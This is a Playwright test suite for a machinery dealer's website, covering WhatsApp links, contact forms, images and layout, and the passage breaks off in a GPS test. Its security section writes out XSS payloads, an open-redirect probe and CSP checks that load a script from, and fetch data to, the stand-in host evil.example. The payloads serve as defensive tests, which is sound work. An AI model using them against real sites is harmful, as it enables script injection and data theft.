#!/usr/bin/env python3
"""Browser tests (Playwright). Starts its own local static server.

Setup (once):   pip install playwright && playwright install chromium
Run:            python3 tests/browser_tests.py

Exits non-zero if any check fails. External hosts (Google Fonts, the Three.js
CDN, Google Maps) are not required: if you are offline those resources simply
fail to load and the site falls back gracefully, which the tests tolerate.
"""
import functools, http.server, os, re, socketserver, sys, threading, urllib.request, urllib.error
from urllib.parse import urlparse, parse_qs, unquote

from playwright.sync_api import sync_playwright

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
WA_NUMBER = "2349022330011"
OFFICIAL_TEL = {"tel:08033100374", "tel:09095555222"}
failures = []

def check(name, ok, detail=""):
    print(("PASS  " if ok else "FAIL  ") + name + (f"  ({detail})" if detail and not ok else ""))
    if not ok:
        failures.append(name)

class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *a): pass

def start_server():
    handler = functools.partial(Quiet, directory=ROOT)
    srv = socketserver.ThreadingTCPServer(("127.0.0.1", 0), handler)
    srv.daemon_threads = True
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, f"http://127.0.0.1:{srv.server_address[1]}"

def http_status(url):
    try:
        return urllib.request.urlopen(url).status
    except urllib.error.HTTPError as e:
        return e.code

INIT_JS = """
window.__opened = [];
window.open = function(u){ window.__opened.push(String(u)); return null; };
window.__viol = [];
document.addEventListener('securitypolicyviolation', e => window.__viol.push(e.violatedDirective + ' ' + e.blockedURI));
"""

def wa_parts(url):
    u = urlparse(url)
    q = parse_qs(u.query, keep_blank_values=True)
    return u.scheme, u.netloc, u.path, q

def wait_until(page, js, timeout_ms=5000, step=100):
    """Poll with evaluate(). Playwright's built-in wait helper evaluates strings with eval(), which the site's CSP (correctly) refuses."""
    waited = 0
    while waited < timeout_ms:
        if page.evaluate(js): return True
        page.wait_for_timeout(step); waited += step
    return False

def scroll_through(page, step=500, wait=90):
    h = page.evaluate("document.body.scrollHeight")
    y = 0
    while y < h:
        page.evaluate(f"window.scrollTo(0,{y})"); page.wait_for_timeout(wait); y += step
    page.evaluate("window.scrollTo(0,0)"); page.wait_for_timeout(150)

srv, BASE = start_server()
PAGES = ["index.html", "machinery.html", "spare-parts.html", "about.html", "quote.html", "contact.html", "404.html"]

with sync_playwright() as pw:
    browser = pw.chromium.launch()

    def new_page(w=1440, h=900, mobile=False):
        ctx = browser.new_context(viewport={"width": w, "height": h}, is_mobile=mobile, has_touch=mobile)
        pg = ctx.new_page()
        pg.add_init_script(INIT_JS)
        return ctx, pg

    # ------------------------------------------------------------------ data
    ctx, pg = new_page()
    pg.goto(f"{BASE}/machinery.html"); pg.wait_for_timeout(300)
    products = pg.evaluate("PRODUCTS.map(p => ({slug:p.slug,name:p.name,cat:getCategoryBySlug(p.category).name,models:(p.models||[]).map(m=>m.code)}))")
    cats = pg.evaluate("CATEGORIES.map(c => c.slug)")
    print(f"Loaded {len(products)} machines in {len(cats)} categories\n")

    print("== 1. WhatsApp links on every machine page ==")
    bad = []
    for p in products:
        pg.goto(f"{BASE}/product.html?slug={p['slug']}"); pg.wait_for_timeout(120)
        for sel, must in (("#product-whatsapp", "interested"), ("#product-whatsapp-availability", "availability")):
            href = pg.get_attribute(sel, "href") or ""
            scheme, host, path, q = wa_parts(href)
            text = q.get("text", [""])[0]
            ok = (scheme == "https" and host == "wa.me" and path == f"/{WA_NUMBER}" and list(q) == ["text"]
                  and p["name"] in text and p["cat"] in text and must in text.lower()
                  and all(m in text for m in p["models"]))
            if not ok:
                bad.append(f"{p['slug']} {sel}")
        qhref = pg.get_attribute("#product-quote-link", "href")
        if qhref != f"quote.html?product={p['slug']}":
            bad.append(f"{p['slug']} quote link")
    check("every machine: enquire + availability messages carry name, category, models; number fixed", not bad, ", ".join(bad[:5]))
    pg.goto(f"{BASE}/product.html?slug=six-lines-bag-making-machine"); pg.wait_for_timeout(200)
    desc = pg.inner_text("#product-description")
    check("machine page shows description text", len(desc) > 60)
    check("machine page shows model table", pg.locator("#product-specs tr").count() == 3)
    check("machine page shows both CTAs (quote + whatsapp)", pg.is_visible("#product-quote-link") and pg.is_visible("#product-whatsapp"))
    ctx.close()

    print("\n== 2. Every WhatsApp anchor on every page uses the official number ==")
    ctx, pg = new_page()
    bad = []
    for u in PAGES + ["product.html?slug=hydraulic-punching-machine"]:
        pg.goto(f"{BASE}/{u}"); pg.wait_for_timeout(200)
        for href in pg.eval_on_selector_all("[data-whatsapp]", "els => els.map(e => e.getAttribute('href'))"):
            scheme, host, path, q = wa_parts(href or "")
            if not (scheme == "https" and host == "wa.me" and path == f"/{WA_NUMBER}" and list(q) == ["text"]):
                bad.append(f"{u}: {href}")
        # nothing else on the page may point at another WhatsApp/wa number
        for href in pg.eval_on_selector_all("a[href]", "els => els.map(e => e.href)"):
            if ("wa.me" in href or "whatsapp" in href.lower()) and f"/{WA_NUMBER}" not in href:
                bad.append(f"{u}: stray {href}")
    check("all WhatsApp links -> https://wa.me/2349022330011 with only a text param", not bad, "; ".join(bad[:4]))
    ctx.close()

    print("\n== 3. Phone numbers ==")
    ctx, pg = new_page()
    bad = []
    for u in PAGES + ["product.html?slug=hydraulic-punching-machine"]:
        pg.goto(f"{BASE}/{u}"); pg.wait_for_timeout(200)
        tels = set(pg.eval_on_selector_all("a[href^='tel:']", "els => els.map(e => e.getAttribute('href'))"))
        if not OFFICIAL_TEL <= tels or tels - OFFICIAL_TEL:
            bad.append(f"{u}: {sorted(tels)}")
        text = pg.inner_text("body")
        for m in re.findall(r"\b0\d{3}[\s-]?\d{3}[\s-]?\d{4}\b|\b0\d{10}\b", text):
            if re.sub(r"\D", "", m) not in {"08033100374", "09095555222", "09022330011"}:
                bad.append(f"{u}: stray number {m}")
    check("each page shows only the two official call numbers (+ the WhatsApp number)", not bad, "; ".join(bad[:4]))
    pg.goto(f"{BASE}/contact.html"); pg.wait_for_timeout(200)
    check("contact page lists both call numbers as tel: links", pg.locator("a[href='tel:08033100374']").count() >= 1 and pg.locator("a[href='tel:09095555222']").count() >= 1)
    ctx.close()

    print("\n== 4. Quotation form -> WhatsApp (all fields, hostile input) ==")
    ctx, pg = new_page()
    pg.goto(f"{BASE}/quote.html?product=six-lines-bag-making-machine"); pg.wait_for_timeout(300)
    check("product preselected from URL", pg.input_value("#qf-product") == "six-lines-bag-making-machine" and pg.is_visible("#selected-product-chip"))
    vals = {
        "#qf-name": "Ada O'Neil & Sons? #1 100%",
        "#qf-company": "A&B <b>Plastics</b> Ltd",
        "#qf-phone": "+234 (803) 310-0374",
        "#qf-email": "ada+test@example.co.uk",
        "#qf-location": "Awka, Nigeria",
        "#qf-quantity": "2 units",
        "#qf-message": "Need 2 units.\nSecond line with \"quotes\", 'apostrophes' and 🚀\n&text=INJECTED&phone=999 #hash ?q=1 <script>window.__xss=1</script>",
    }
    for sel, v in vals.items():
        pg.fill(sel, v)
    pg.click("#quote-form button[type=submit]"); pg.wait_for_timeout(250)
    opened = pg.evaluate("window.__opened")
    check("submit opens exactly one WhatsApp link", len(opened) == 1)
    scheme, host, path, q = wa_parts(opened[0])
    check("quote destination is fixed to the official number", (scheme, host, path) == ("https", "wa.me", f"/{WA_NUMBER}"))
    check("no injected URL parameters (only 'text')", list(q) == ["text"], str(list(q)))
    msg = q["text"][0]
    missing = [k for k, v in vals.items() if v not in msg]
    check("every entered field appears verbatim in the message", not missing, str(missing))
    mm = pg.evaluate("getProductBySlug('six-lines-bag-making-machine')")
    check("message includes machine name, category and all model codes",
          mm["name"] in msg and "Bag Making Machines" in msg and all(m["code"] in msg for m in mm["models"]))
    check("message is structured (headings present)", all(h in msg for h in ("CUSTOMER INFORMATION", "MACHINE INFORMATION", "REQUEST DETAILS")) and msg.startswith("Hello Machinery Warehouse Outlet,"))
    check("preview shows exactly what will be sent", pg.inner_text("#quote-message-preview") == msg and pg.is_visible("#quote-message-preview"))
    link_in_status = pg.get_attribute("#quote-status a", "href")
    check("manual fallback link equals the opened link", link_in_status == opened[0])
    check("no script execution / HTML injection", pg.evaluate("window.__xss") is None and pg.locator("#quote-status b, #quote-message-preview b, #quote-status script").count() == 0)
    # optional fields omitted -> no empty lines / undefined
    pg.goto(f"{BASE}/quote.html"); pg.wait_for_timeout(200)
    pg.fill("#qf-name", "Chi"); pg.fill("#qf-phone", "08033100374"); pg.fill("#qf-message", "Price please")
    pg.click("#quote-form button[type=submit]"); pg.wait_for_timeout(200)
    msg2 = wa_parts(pg.evaluate("window.__opened")[0])[3]["text"][0]
    check("omitted optional fields are left out cleanly", not re.search(r"undefined|null|Company:|Email:|Location:|Quantity:|MACHINE INFORMATION", msg2) and "Chi" in msg2 and "Price please" in msg2)
    # validation
    cases = {
        "empty": {}, "bad email": {"#qf-name": "A", "#qf-phone": "08033100374", "#qf-message": "x", "#qf-email": "not-an-email"},
        "letters in phone": {"#qf-name": "A", "#qf-phone": "abcdefgh", "#qf-message": "x"},
        "phone too short": {"#qf-name": "A", "#qf-phone": "123", "#qf-message": "x"},
        "whitespace message": {"#qf-name": "A", "#qf-phone": "08033100374", "#qf-message": "    "},
        "missing name": {"#qf-phone": "08033100374", "#qf-message": "x"},
    }
    for label, data in cases.items():
        pg.goto(f"{BASE}/quote.html"); pg.wait_for_timeout(150)
        for sel, v in data.items(): pg.fill(sel, v)
        pg.click("#quote-form button[type=submit]"); pg.wait_for_timeout(150)
        check(f"validation blocks: {label}", pg.evaluate("window.__opened.length") == 0 and pg.locator(".field.has-error").count() >= 1)
    # extreme input: allowed when normal-sized, blocked (not truncated) when too long to hand to WhatsApp
    def fill_max(ch):
        pg.goto(f"{BASE}/quote.html"); pg.wait_for_timeout(150)
        lim = {"#qf-name": 100, "#qf-company": 100, "#qf-location": 100, "#qf-quantity": 30, "#qf-message": 600}
        for sel, n in lim.items(): pg.eval_on_selector(sel, "(e,v)=>{e.value=v}", ch * n)
        pg.fill("#qf-phone", "0" * 20); pg.fill("#qf-email", "x@example.com")
        pg.click("#quote-form button[type=submit]"); pg.wait_for_timeout(200)
    fill_max("a")
    check("maxed-out plain text enquiry is still sent in full", pg.evaluate("window.__opened.length") == 1 and len(pg.evaluate("window.__opened[0]")) < 6000)
    fill_max("🚀")
    check("extreme emoji-length enquiry is blocked with a clear message, not truncated",
          pg.evaluate("window.__opened.length") == 0 and "too long" in pg.inner_text("#quote-status").lower())
    check("input length limits set (maxlength on all text inputs)", pg.evaluate("[...document.querySelectorAll('#quote-form input[type=text],#quote-form input[type=tel],#quote-form input[type=email],#quote-form textarea')].every(e => e.maxLength > 0)"))
    ctx.close()

    print("\n== 5. Contact form -> WhatsApp ==")
    ctx, pg = new_page()
    pg.goto(f"{BASE}/contact.html"); pg.wait_for_timeout(300)
    pg.fill("#cf-name", "Tunde & Co #5"); pg.fill("#cf-email", "tunde@example.com")
    pg.fill("#cf-message", "Hello?\n&text=EVIL <img src=x onerror=window.__xss=1>")
    pg.click("#contact-form button[type=submit]"); pg.wait_for_timeout(250)
    op = pg.evaluate("window.__opened")
    s_, h_, p_, q_ = wa_parts(op[0]) if op else ("", "", "", {})
    check("contact form opens WhatsApp to the official number, only a text param", op and (s_, h_, p_) == ("https", "wa.me", f"/{WA_NUMBER}") and list(q_) == ["text"])
    t = q_.get("text", [""])[0]
    check("contact message contains all fields verbatim", all(v in t for v in ("Tunde & Co #5", "tunde@example.com", "&text=EVIL")))
    check("contact form: no markup injection", pg.evaluate("window.__xss") is None and pg.locator("#contact-status img").count() == 0)
    pg.goto(f"{BASE}/contact.html"); pg.fill("#cf-name", "A"); pg.fill("#cf-email", "bad"); pg.fill("#cf-message", "m")
    pg.click("#contact-form button[type=submit]"); pg.wait_for_timeout(150)
    check("contact form validates email", pg.evaluate("window.__opened.length") == 0 and pg.locator(".field.has-error").count() >= 1)
    ctx.close()

    print("\n== 6. Contextual messages for other actions ==")
    ctx, pg = new_page()
    msgs = {}
    for label, url, sel in (("floating/general", "index.html", ".float-whatsapp"), ("spare parts", "spare-parts.html", "a[data-whatsapp-intent=spareparts]"),
                            ("machinery consult", "machinery.html", "a[data-whatsapp-intent=consult]"), ("quote sidebar", "quote.html", "a[data-whatsapp-intent=quote]")):
        pg.goto(f"{BASE}/{url}"); pg.wait_for_timeout(200)
        msgs[label] = wa_parts(pg.locator(sel).first.get_attribute("href"))[3]["text"][0]
    check("each context produces a different, relevant message", len(set(msgs.values())) == 4 and "spare part" in msgs["spare parts"] and "quote" in msgs["quote sidebar"].lower() and "which machine" in msgs["machinery consult"])
    ctx.close()

    print("\n== 7. Floating buttons: behaviour and collisions ==")
    def rects(pg):
        return pg.evaluate("""() => { const r = s => { const e = document.querySelector(s); if(!e) return null; const cs = getComputedStyle(e); const b = e.getBoundingClientRect();
            return {vis: cs.display !== 'none' && cs.visibility !== 'hidden' && parseFloat(cs.opacity) > 0.5, l:b.left,t:b.top,r:b.right,b:b.bottom}; };
            return {wa:r('.float-whatsapp'), top:r('.float-totop'), bar:r('.mobile-actionbar'), vw:innerWidth, vh:innerHeight}; }""")
    def overlap(a, b):
        return a and b and not (a["r"] <= b["l"] or b["r"] <= a["l"] or a["b"] <= b["t"] or b["b"] <= a["t"])
    for label, (w, h, mob) in {"desktop 1440x900": (1440, 900, False), "laptop 1280x600": (1280, 600, False), "tablet 768x1024": (768, 1024, False),
                               "mobile 360x780": (360, 780, True), "mobile 320x568": (320, 568, True)}.items():
        ctx, pg = new_page(w, h, mob)
        pg.goto(f"{BASE}/machinery.html"); pg.wait_for_timeout(300)
        r0 = rects(pg)
        check(f"[{label}] back-to-top hidden at top of page", r0["top"] and not r0["top"]["vis"])
        pg.evaluate("window.scrollTo(0, 1500)"); pg.wait_for_timeout(500)
        r1 = rects(pg)
        check(f"[{label}] back-to-top appears after scrolling", r1["top"]["vis"])
        within = lambda x: x and x["l"] >= 0 and x["t"] >= 0 and x["r"] <= r1["vw"] and x["b"] <= r1["vh"]
        check(f"[{label}] floating buttons fully inside viewport", within(r1["top"]) and within(r1["wa"]))
        check(f"[{label}] floating WhatsApp visible", r1["wa"]["vis"])
        check(f"[{label}] WhatsApp and back-to-top do not overlap", not overlap(r1["wa"], r1["top"]))
        check(f"[{label}] WhatsApp is not covered by the action bar", not (r1["bar"] and pg.evaluate("getComputedStyle(document.querySelector('.mobile-actionbar')).display") != "none" and overlap(r1["wa"], r1["bar"])))
        if r1["bar"] and pg.evaluate("getComputedStyle(document.querySelector('.mobile-actionbar')).display") != "none":
            check(f"[{label}] back-to-top clears the bottom action bar", not overlap(r1["top"], r1["bar"]))
        pg.click(".float-totop"); wait_until(pg, "window.scrollY < 5", 4000)
        check(f"[{label}] back-to-top returns to top", pg.evaluate("window.scrollY") < 5)
        ctx.close()
    ctx, pg = new_page()
    pg.goto(f"{BASE}/index.html"); pg.wait_for_timeout(200)
    check("floating WhatsApp has accessible name", "WhatsApp" in (pg.get_attribute(".float-whatsapp", "aria-label") or ""))
    check("back-to-top has accessible name", (pg.get_attribute(".float-totop", "aria-label") or "") == "Back to top")
    pg.keyboard.press("Tab")
    tabbable = pg.evaluate("[...document.querySelectorAll('.float-whatsapp,.float-totop')].every(e => e.tabIndex >= 0)")
    check("floating buttons are keyboard reachable", tabbable)
    check("WhatsApp bubble has a subtle animation", pg.evaluate("getComputedStyle(document.querySelector('.float-whatsapp')).animationName") == "wa-breathe")
    pg.emulate_media(reduced_motion="reduce")
    check("animation is disabled under prefers-reduced-motion", pg.evaluate("parseFloat(getComputedStyle(document.querySelector('.float-whatsapp')).animationDuration)") < 0.01)
    ctx.close()

    print("\n== 8. Removed content is really gone ==")
    ctx, pg = new_page()
    pg.goto(f"{BASE}/machinery.html"); pg.wait_for_timeout(300)
    check("machinery list count equals data count", pg.locator("#machinery-grid .card").count() == len(products))
    for term in ("fuel", "dispenser", "pump", "woven", "bag making machine"):
        pg.fill("#machinery-search", term); pg.wait_for_timeout(150)
        n = pg.locator("#machinery-grid .card").count()
        if term in ("fuel", "dispenser", "pump", "woven"):
            check(f"search '{term}' finds nothing", n == 0 and pg.is_visible("#machinery-empty"))
    pg.fill("#machinery-search", "")
    chips = pg.eval_on_selector_all("#machinery-chips .chip", "els => els.map(e => e.textContent.toLowerCase())")
    check("no fuel category chip", not any("fuel" in c for c in chips) and len(chips) == len(cats) + 1)
    for slug in ("single-pump-fuel-dispenser", "double-pump-fuel-dispenser", "automatic-non-woven-fabrics-bag-making-machine"):
        pg.goto(f"{BASE}/product.html?slug={slug}"); pg.wait_for_timeout(200)
        check(f"/{slug} shows 'not found'", "not found" in pg.inner_text("#product-root").lower())
    pg.goto(f"{BASE}/quote.html?product=double-pump-fuel-dispenser"); pg.wait_for_timeout(200)
    check("quote deep link to removed machine ignored", pg.input_value("#qf-product") == "" and not pg.is_visible("#selected-product-chip"))
    pg.goto(f"{BASE}/machinery.html?category=fuel-dispensing"); pg.wait_for_timeout(200)
    check("removed category URL shows no machines, no crash", pg.locator("#machinery-grid .card").count() == 0)
    check("catalogue page returns 404", http_status(f"{BASE}/catal" + "ogue.html") == 404)
    check("catalogue PDF returns 404", http_status(f"{BASE}/assets/machinery-warehouse-outlet-catal" + "ogue.pdf") == 404)
    banned = re.compile(r"La" + r"gos|Abu" + r"ja|catal" + r"ogue|fuel|non[\s-]?woven|branch", re.I)
    leaks = []
    for u in PAGES + [f"product.html?slug={p['slug']}" for p in products]:
        pg.goto(f"{BASE}/{u}"); pg.wait_for_timeout(120)
        html = pg.content()
        txt = pg.inner_text("body")
        m = banned.search(html + txt)
        if m: leaks.append(f"{u}: {m.group(0)}")
        for a in pg.eval_on_selector_all("a[href]", "els => els.map(e => e.getAttribute('href'))"):
            if a and "catal" + "ogue" in a: leaks.append(f"{u}: link {a}")
    check("rendered pages (HTML + text) contain no removed terms", not leaks, "; ".join(leaks[:4]))
    ctx.close()

    print("\n== 9. Images: colour, sharpness, aspect ratio, no broken images ==")
    ctx, pg = new_page()
    bad_load, bad_alt, bad_filter, small = [], [], [], []
    sat_values = {}
    for u in PAGES + [f"product.html?slug={p['slug']}" for p in products]:
        pg.goto(f"{BASE}/{u}"); pg.wait_for_timeout(150); scroll_through(pg, 600, 70); pg.wait_for_timeout(250)
        info = pg.evaluate("""() => [...document.images].map(i => ({src:i.currentSrc||i.src, ok:i.complete && i.naturalWidth>0, alt:i.alt, nw:i.naturalWidth, nh:i.naturalHeight,
              rw:i.getBoundingClientRect().width, rh:i.getBoundingClientRect().height, filter:getComputedStyle(i).filter, fit:getComputedStyle(i).objectFit, vis:getComputedStyle(i).display!=='none' && i.getBoundingClientRect().width>0}))""")
        for i in info:
            if not i["vis"]: continue
            if not i["ok"]: bad_load.append(f"{u}: {i['src']}")
            if not i["alt"].strip(): bad_alt.append(f"{u}: {i['src']}")
            if "grayscale" in i["filter"] or "sepia" in i["filter"] or "saturate(0" in i["filter"]: bad_filter.append(f"{u}: {i['src']} {i['filter']}")
            if i["fit"] not in ("cover", "contain", "fill", "scale-down", "none"): pass
            if u.startswith("product.html") and "product-photo" in str(i["src"]) : pass
        if u.startswith("product.html"):
            ph = pg.evaluate("""() => { const i = document.querySelector('#product-image'); if(!i) return null; return {nw:i.naturalWidth, nh:i.naturalHeight, rw:i.getBoundingClientRect().width, rh:i.getBoundingClientRect().height, fit:getComputedStyle(i).objectFit}; }""")
            if ph:
                if ph["nw"] < 900: small.append(f"{u}: natural width {ph['nw']}")
                # contain: the displayed box may be letterboxed but the image is never stretched (contain) -> verify fit
                if ph["fit"] != "contain": bad_filter.append(f"{u}: detail image object-fit {ph['fit']}")
    check("no broken images on any page", not bad_load, "; ".join(bad_load[:4]))
    check("every visible image has alt text", not bad_alt, "; ".join(bad_alt[:4]))
    check("no grayscale/sepia filters on machine images (colour preserved)", not bad_filter, "; ".join(bad_filter[:4]))
    check("detail photos are high resolution (>=900px wide) and use object-fit: contain", not small, "; ".join(small[:4]))
    # colourfulness measured from the real pixels of each detail photo
    low = []
    for p in products:
        pg.goto(f"{BASE}/product.html?slug={p['slug']}"); wait_until(pg, "document.querySelector('#product-image').complete && document.querySelector('#product-image').naturalWidth>0")
        sat = pg.evaluate("""() => { const i = document.querySelector('#product-image'); const c = document.createElement('canvas'); c.width = 160; c.height = Math.round(160*i.naturalHeight/i.naturalWidth);
            const x = c.getContext('2d'); x.drawImage(i,0,0,c.width,c.height); const d = x.getImageData(0,0,c.width,c.height).data; let s=0,n=0;
            for (let k=0;k<d.length;k+=4){ s += Math.max(d[k],d[k+1],d[k+2]) - Math.min(d[k],d[k+1],d[k+2]); n++; } return s/n; }""")
        sat_values[p["slug"]] = sat
        if sat < 3: low.append(f"{p['slug']}={sat:.1f}")
    check("source photos are colour (mean channel spread >= 3)", not low, ", ".join(low))
    print(f"      colourfulness range: {min(sat_values.values()):.1f} to {max(sat_values.values()):.1f}")
    # card rendering: 4:3 boxes use cover (no distortion)
    pg.goto(f"{BASE}/machinery.html"); pg.wait_for_timeout(300)
    check("grid photos use object-fit: cover (no stretching)", pg.evaluate("[...document.querySelectorAll('.card-media img')].every(i => getComputedStyle(i).objectFit === 'cover')"))
    ctx.close()

    print("\n== 10. Security probes ==")
    ctx, pg = new_page()
    errors, viol = [], []
    pg.on("pageerror", lambda e: errors.append(str(e)))
    payloads = [
        "product.html?slug=%3Cimg%20src%3Dx%20onerror%3Dwindow.__xss%3D1%3E",
        "product.html?slug=%22%3E%3Cscript%3Ewindow.__xss%3D1%3C%2Fscript%3E",
        "machinery.html?category=%3Csvg%2Fonload%3Dwindow.__xss%3D1%3E",
        "machinery.html?category=%22%3E%3Cimg%20src%3Dx%20onerror%3Dwindow.__xss%3D1%3E",
        "quote.html?product=%3Cimg%20src%3Dx%20onerror%3Dwindow.__xss%3D1%3E",
        "contact.html?x=%3Cscript%3Ewindow.__xss%3D1%3C%2Fscript%3E",
        "index.html#%3Cimg%20src%3Dx%20onerror%3Dwindow.__xss%3D1%3E",
        "product.html?slug=six-lines-bag-making-machine&redirect=https://evil.example/&next=//evil.example",
    ]
    bad = []
    for u in payloads:
        pg.goto(f"{BASE}/{u}"); pg.wait_for_timeout(350)
        if pg.evaluate("window.__xss") is not None: bad.append(f"EXECUTED {u}")
        if pg.locator("img[src='x'], script:not([src])").count(): bad.append(f"INJECTED NODE {u}")
        if not pg.url.startswith(BASE): bad.append(f"REDIRECTED {u}")
    check("URL parameter payloads do not execute, inject nodes, or redirect", not bad, "; ".join(bad))
    pg.goto(f"{BASE}/machinery.html"); pg.wait_for_timeout(250)
    pg.fill("#machinery-search", "<img src=x onerror=window.__xss=1>"); pg.wait_for_timeout(200)
    check("search box input is never rendered as HTML", pg.evaluate("window.__xss") is None and pg.locator("#machinery-grid img[src='x']").count() == 0)
    # CSP is actively enforced by the browser
    pg.goto(f"{BASE}/index.html"); pg.wait_for_timeout(300)
    pg.evaluate("() => { const s = document.createElement('script'); s.textContent = 'window.__csp_test = 1'; document.body.appendChild(s); }")
    pg.wait_for_timeout(150)
    v = pg.evaluate("window.__viol")
    check("CSP blocks an injected inline script", pg.evaluate("window.__csp_test") is None and any(x.startswith("script-src") for x in v), str(v))
    pg.evaluate("() => { const s = document.createElement('script'); s.src = 'https://evil.example/x.js'; document.body.appendChild(s); }")
    pg.wait_for_timeout(200)
    check("CSP blocks a script from a non-allow-listed host", any("evil.example" in x for x in pg.evaluate("window.__viol")))
    pg.evaluate("() => { try { fetch('https://evil.example/collect').catch(()=>{}); } catch(e){} }"); pg.wait_for_timeout(200)
    check("CSP blocks outbound fetch to other hosts (connect-src)", any(x.startswith("connect-src") for x in pg.evaluate("window.__viol")))
    # legit page loads must not trigger CSP violations
    clean = []
    for u in PAGES + ["product.html?slug=hydraulic-punching-machine"]:
        ctx2, p2 = new_page()
        p2.goto(f"{BASE}/{u}"); p2.wait_for_timeout(500); scroll_through(p2, 700, 60)
        vv = p2.evaluate("window.__viol")
        if vv: clean.append(f"{u}: {vv[:2]}")
        ctx2.close()
    check("no CSP violations during normal page loads", not clean, "; ".join(clean))
    check("no uncaught JavaScript errors across probes", not errors, "; ".join(errors[:3]))
    ctx.close()

    print("\n== 11. Responsive sweep ==")
    sizes = [(320, 568), (360, 780), (390, 844), (412, 915), (768, 1024), (1024, 768), (1279, 800), (1280, 800), (1440, 900), (1920, 1080)]
    EDGE_JS = """() => { const vw = innerWidth; let bad = [];
      for (const el of document.querySelectorAll('body *')) {
        if (el.closest('.mobile-menu,.mobile-actionbar,.lightbox,.float-btn,script,style')) continue;
        let t = false; for (const n of el.childNodes) if (n.nodeType===3 && n.textContent.trim().length>1) t = true; if (!t) continue;
        const cs = getComputedStyle(el); if (cs.display==='none' || cs.visibility==='hidden') continue;
        const r = el.getBoundingClientRect(); if (!r.width || !r.height) continue;
        if (r.left < 10 || r.right > vw - 10) bad.push((el.className||el.tagName)+'|'+el.textContent.trim().slice(0,24)); }
      return {edge: bad.slice(0,3), over: document.documentElement.scrollWidth > vw + 1, sw: document.documentElement.scrollWidth}; }"""
    sweep_pages = PAGES + ["product.html?slug=ibc-rotary-film-blowing-machine", "product.html?slug=accessories-and-moulds"]
    problems = []
    for (w, h) in sizes:
        ctx, pg = new_page(w, h, w < 500)
        for u in sweep_pages:
            pg.goto(f"{BASE}/{u}"); pg.wait_for_timeout(220)
            r = pg.evaluate(EDGE_JS)
            if r["over"] or r["edge"]: problems.append(f"{w}px {u}: {r}")
        ctx.close()
    check(f"no horizontal overflow or edge-touching text ({len(sizes)} sizes x {len(sweep_pages)} pages)", not problems, "; ".join(problems[:3]))
    ctx, pg = new_page(1279, 800)
    pg.goto(f"{BASE}/index.html"); pg.wait_for_timeout(200)
    check("1279px: hamburger shown, desktop nav hidden", pg.is_visible(".nav-toggle") and not pg.is_visible(".nav-links"))
    ctx.close()
    ctx, pg = new_page(1280, 800)
    pg.goto(f"{BASE}/index.html"); pg.wait_for_timeout(200)
    nav = pg.evaluate("(() => { const l = document.querySelector('.nav-links').getBoundingClientRect(); const a = document.querySelector('.nav-actions').getBoundingClientRect(); return a.left - l.right; })()")
    check("1280px: nav links and CTA do not collide", nav > 40, f"gap {nav:.0f}px")
    labels = pg.eval_on_selector_all(".nav-links a", "els => els.map(e => e.textContent.trim())")
    check("navigation has no catalogue link", labels == ["Home", "Machinery", "Spare Parts", "About", "Contact"], str(labels))
    ctx.close()
    ctx, pg = new_page(390, 844, True)
    pg.goto(f"{BASE}/index.html"); pg.wait_for_timeout(200)
    pg.click(".nav-toggle"); pg.wait_for_timeout(450)
    check("mobile menu opens", pg.evaluate("document.querySelector('.mobile-menu').classList.contains('is-open')") and pg.get_attribute(".nav-toggle", "aria-expanded") == "true")
    mlabels = pg.eval_on_selector_all(".mobile-menu a:not(.btn)", "els => els.map(e => e.textContent.replace('→','').trim())")
    check("mobile menu has no catalogue link", not any("catal" + "ogue" in m.lower() for m in mlabels), str(mlabels))
    ctx.close()

    print("\n== 12. Email removal ==")
    ctx, pg = new_page()
    bad = []
    for u in PAGES + ["product.html?slug=hydraulic-punching-machine"]:
        pg.goto(f"{BASE}/{u}"); pg.wait_for_timeout(200)
        mails = set(pg.eval_on_selector_all("a[href^='mailto:']", "els => els.map(e => e.getAttribute('href'))"))
        if mails != {"mailto:machines.warehouse@gmail.com"}: bad.append(f"{u}: {sorted(mails)}")
        if "juni" + "net" in pg.content().lower() + pg.inner_text("body").lower(): bad.append(f"{u}: removed email text present")
    check("every page shows only machines.warehouse@gmail.com (mailto link and text)", not bad, "; ".join(bad[:3]))
    check("removed email does not appear in the site data", pg.evaluate("COMPANY.emails.length") == 1 and "juni" + "net" not in pg.evaluate("JSON.stringify(COMPANY)"))
    ctx.close()

    print("\n== 13. Location, map and live GPS ==")
    import math
    def haversine(a, b, c, d):
        r = math.radians; x = math.sin(r(c - a) / 2) ** 2 + math.cos(r(a)) * math.cos(r(c)) * math.sin(r(d - b) / 2) ** 2
        return 6371.0088 * 2 * math.asin(math.sqrt(x))
    ctx, pg = new_page()
    pg.goto(f"{BASE}/contact.html"); pg.wait_for_timeout(300)
    loc = pg.evaluate("COMPANY.location")
    pair = f"{loc['lat']},{loc['lng']}"
    iframe_src = pg.get_attribute(".map-frame iframe", "src") or ""
    u = urlparse(iframe_src); q = parse_qs(u.query)
    check("map is embedded from Google at the configured coordinates", u.netloc == "www.google.com" and q.get("q") == [pair] and q.get("output") == ["embed"], iframe_src)
    check("map iframe has an accessible title", len(pg.get_attribute(".map-frame iframe", "title") or "") > 10)
    links = {t: pg.get_attribute(f"a:text-is('{t}')", "href") for t in ("Get directions", "Google Maps", "Apple Maps", "Waze")}
    check("Google, Apple Maps and Waze links all point at the same coordinates", all(pair in (h or "") for h in links.values()), str(links))
    check("direction links open safely in a new tab", pg.evaluate("[...document.querySelectorAll('.map-actions a')].every(a => a.target === '_blank' && a.rel.includes('noopener'))"))
    check("GPS coordinates are shown as text for any other GPS device", f"{loc['lat']}, {loc['lng']}" in pg.inner_text(".coords"))
    notes = pg.eval_on_selector_all(".map-note", "els => els.map(e => e.textContent)")
    check("while unverified, the page says the pin marks the road area (no false precision)", any("Ezeiweka Road area" in n for n in notes), str(notes))
    check("address text on the contact page is the exact business address", "2 Ichi Street, Off Ezeiweka Road, Awada-Obosi, Anambra State" in pg.inner_text("body"))
    ctx.close()
    for u_ in ("index.html", "about.html"):
        ctx, pg = new_page(); pg.goto(f"{BASE}/{u_}"); pg.wait_for_timeout(250)
        hrefs = pg.eval_on_selector_all("a[href*='google.com/maps']", "els => els.map(e => e.href)")
        check(f"{u_}: address / directions link goes to the configured coordinates", hrefs and all(pair in h for h in hrefs), str(hrefs))
        ctx.close()
    # live GPS: simulated positions
    for label, (la, lo) in {"about 9 km away": (6.2000, 6.8700), "at the office": (float(loc['lat']), float(loc['lng'])), "far away (Lagos area)": (6.5244, 3.3792)}.items():
